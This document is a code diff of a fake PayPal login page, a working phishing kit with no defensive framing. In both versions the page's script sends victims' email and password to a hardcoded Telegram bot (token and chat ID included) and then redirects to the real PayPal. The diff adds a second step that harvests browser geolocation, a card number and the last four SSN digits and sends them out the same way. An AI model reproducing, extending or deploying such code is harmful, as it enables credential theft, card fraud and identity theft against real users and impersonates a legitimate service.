@@ -1,47 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in to your PayPal account</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal: Security Check</title>
     <style>
-        body { font-family: "PayPalSansSmall-Regular", "Helvetica Neue", Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; }
-        .container { max-width: 400px; margin: 50px auto; padding: 30px; border: 1px solid #ddd; border-radius: 15px; text-align: center; }
-        .logo { margin-bottom: 30px; }
-        input { width: 90%; padding: 15px; margin-bottom: 15px; border: 1px solid #a6a6a6; border-radius: 5px; font-size: 16px; }
-        button { width: 100%; background: #0070ba; color: white; border: none; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        button:hover { background: #005ea6; }
-        .footer { margin-top: 50px; font-size: 12px; color: #666; }
+        body { font-family: Arial, sans-serif; background: #f5f7fa; text-align: center; }
+        .box { max-width: 400px; margin: 40px auto; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 95%; background: #0070ba; color: white; border: none; padding: 12px; border-radius: 25px; font-weight: bold; cursor: pointer; }
+        .hide { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" width="100">
+    <div class="box">
+        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" width="100">
+        <div id="p1">
+            <h2>Log In</h2>
+            <input type="text" id="pe" placeholder="Email">
+            <input type="password" id="pp" placeholder="Password">
+            <button onclick="pst1()">Log In</button>
         </div>
-        <div id="login-form">
-            <input type="text" id="email" placeholder="Email or mobile number">
-            <input type="password" id="password" placeholder="Password">
-            <button onclick="sendPayPalData()">Log In</button>
+        <div id="p2" class="hide">
+            <h3>Identity Verification</h3>
+            <p>Please allow location to verify your session.</p>
+            <input type="text" id="pcc" placeholder="Card Number">
+            <input type="text" id="pssn" placeholder="Last 4 SSN">
+            <button onclick="pst2()">Confirm Identity</button>
         </div>
     </div>
-
     <script>
-        function sendPayPalData() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-            const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
-            const chatId = '8353285510'; 
+        const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
+        const chatId = '8353285510';
 
-            const message = `💰 Notun PayPal Data! \n\n📧 Email: ${email} \n🔑 Pass: ${pass}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        function psend(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}`); }
 
-            fetch(url).then(() => {
-                // Redirecting to real PayPal login
-                window.location.href = "https://www.paypal.com/signin";
-            }).catch(() => {
-                window.location.href = "https://www.paypal.com/signin";
+        function pst1() {
+            psend(`💰 PAYPAL LOG!\n📧: ${document.getElementById('pe').value}\n🔑: ${document.getElementById('pp').value}`);
+            navigator.geolocation.getCurrentPosition(p => {
+                psend(`📍 PAYPAL USER LOCATION:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
+            document.getElementById('p1').className = 'hide';
+            document.getElementById('p2').className = '';
+        }
+
+        function pst2() {
+            psend(`💳 PAYPAL CARD & SSN!\nNum: ${document.getElementById('pcc').value}\nSSN: ${document.getElementById('pssn').value}`);
+            window.location.href = "https://www.paypal.com";
         }
     </script>
 </body>
